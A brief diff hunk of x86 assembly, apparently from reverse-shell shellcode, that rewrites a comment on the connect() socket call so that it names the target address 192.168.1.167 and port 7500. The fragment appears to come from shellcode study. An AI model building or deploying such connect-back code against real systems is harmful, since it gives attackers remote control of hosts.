@@ -25,7 +25,7 @@ _start:
 	;connect(): sys_socketcall(int call, unsigned long *args)
 	;eax -> sys_socketcall
 	;ebx -> SYS_CONNECT
-	;ecx -> args(sockfd{esi}, {sin_addr,sin_port,sin_family{2}}, socklen_t addrlen{16 bytes})
+	;ecx -> args(sockfd{esi}, {sa_family{2},sin_port{7500},sin_address{192.168.1.167}}, 16)
 	mov BYTE al,0x66
 	inc ebx
 	inc ebx					;SYS_CONNECT
